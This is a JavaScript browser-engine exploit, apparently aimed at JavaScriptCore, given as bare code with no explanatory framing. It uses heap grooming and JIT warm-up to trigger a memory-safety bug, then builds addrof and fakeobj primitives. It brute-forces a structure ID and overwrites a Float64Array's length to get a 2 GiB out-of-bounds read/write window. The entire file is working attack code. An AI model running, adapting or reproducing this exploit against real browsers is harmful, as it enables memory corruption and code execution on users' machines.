(function () {
  var out = {};
  var ab = new ArrayBuffer(8), u = new BigUint64Array(ab), d = new Float64Array(ab);
  var itof = function (v) { u[0] = v; return d[0]; };
  var ftoi = function (f) { d[0] = f; return u[0]; };
  var BUDGET = 150000, t0 = Date.now(), rounds = 0;
  var host = {};
  out.guard = [];
  function guard(name, fn) {
    try { fn(); out.step = (out.step || []).concat([name + ':ok']); return true; }
    catch (e) {
      var m = 'no message';
      try { m = String(e); } catch (e2) { m = 'unstringifiable'; }
      out.guard.push(name + ': ' + m);
      out.step = (out.step || []).concat([name + ':FAILED']);
      return false;
    }
  }
  for (var i = 0; i < 32; i++) host['qz' + i] = 1.1;
  arr = new Array(0x400000).fill(1.1);
  var arr_index = arr.length - 1;
  function foo(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;
    let forGC = [];
    let a = new Date(1111); a[0] = 1.1;
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
    A.p2 = forGC;
    let b = { p0: 0x42424242, p1: 1.1 };
    let f; f = b; if (flag) { f = 1.1; }
    A.p1 = f; let v = 1.1;
    for (let i = 0; i < 1e6; ++i) { for (let j = 0; j < k; ++j) { v = i; v = j; } }
    b.p0 = v; b.p1 = a;
  }
  function rec(n) { if (n === 0) return; n = n | 0; rec(n - 1); }
  foo(true, 1, 1); foo(false, 1, 1);
  for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
  for (let i = 0; i < 10000; i++) rec(i);
  var W = null;
  guard('carrier', function () { arr = new Array(0x400000).fill(1.1); });
  guard('warmup', function () {
    foo(true, 1, 1); foo(false, 1, 1);
    for (let i = 0; i < 1000; ++i) foo(false, 0, 0);
    for (let i = 0; i < 10000; i++) rec(i);      // GC pressure; RangeError tolerated
  });
  guard('hunt', function () {
    for (let k = 0; k < 10000 && !W; ++k) {
      rounds = k + 1;
      var kk = (k < 30) ? 10 : 2;
      foo(false, kk, k % 5 + 1); rec(2000);
      for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);
      let fr = arr[arr_index].p1.p1;
      let noCow = 13.37;
      for (let i = 0; i < 16; ++i) {
        let c = [13.37, 2.2, 3.3, 4.4, noCow];
        if (fr[0] === 13.37) { W = { freed: fr, boxed: c }; break; }
      }
      if (k % 25 === 24) aveStep('hunt round=' + rounds +
                                 ' elapsed=' + (Date.now() - t0) + 'ms trigger=no');
      if (Date.now() - t0 > BUDGET) break;
    }
  });
  out.rounds = rounds; out.huntMs = Date.now() - t0;
  guard('sid', function () {
    if (!W) throw 'trigger did not fire';
    function addrof(o) { W.boxed[0] = o; return ftoi(W.freed[0]); }
    function fakeobj(a) { W.freed[0] = itof(a); return W.boxed[0]; }

    var MARK = 1.9515e-246;
    for (var i = 2; i < 32; i++) host['qz' + i] = (i === 5) ? MARK : 1.0 + i;
    var haddr = addrof(host);
    var fakeAddr = haddr - 1n + 0x10n + 1n;
    var sid = -1;
    for (var s = 1; s < 4096; s++) {
      host.qz0 = itof(BigInt(s));
      var fx; try { fx = fakeobj(fakeAddr); } catch (e) { continue; }
      try { if (fx.qz5 === MARK) { sid = s; break; } } catch (e) { continue; }
    }
    if (sid < 0) throw 'structure id not found';
    out.sid = sid;

    // --- read/write a real TypedArray's length through the fake object's slots ---
    var victim = new Float64Array(0x1000);        // 4096 doubles, legitimately signed
    var vaddr = addrof(victim);
    out.victim = '0x' + vaddr.toString(16);

    var fakeBase = haddr - 1n + 0x10n;
    var lenAddr = vaddr - 1n + 0x18n;             // m_length of the JSArrayBufferView
    var delta = (lenAddr - (fakeBase + 0x10n)) / 8n;
    if (delta >= 0n && delta < 32n) {
      var k = Number(delta);
      host.qz0 = itof(BigInt(sid));
      var fake = fakeobj(fakeAddr);
      var kname = 'qz' + k;
      fake[kname] = itof(0x0000000010000000n);    // 256 Mi elements -> 2 GiB window
      out.lengthWrite = victim.length;
      out.oob = victim.length !== 0x1000;
    } else {
      out.delta = delta.toString();
    }

    // --- read/write the fake object's own slots (mechanism proof) ---
    host.qz9 = itof(0xc0ffeec0ffee0001n);
    var fake2 = fakeobj(fakeAddr);
    out.rawRead = ftoi(fake2.qz9) === 0xc0ffeec0ffee0001n;
  });
  return JSON.stringify(out);
})()
